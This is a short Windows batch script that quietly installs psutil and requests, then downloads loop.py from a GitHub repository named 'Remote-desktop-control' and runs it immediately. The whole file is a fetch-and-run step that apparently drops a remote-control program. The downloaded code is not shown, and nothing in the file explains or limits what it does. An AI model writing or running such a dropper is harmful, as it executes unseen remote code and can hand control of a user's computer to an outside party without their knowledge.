@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://github.com/matrixlolz/Remote-desktop-control/raw/main/loop.py
python loop.py
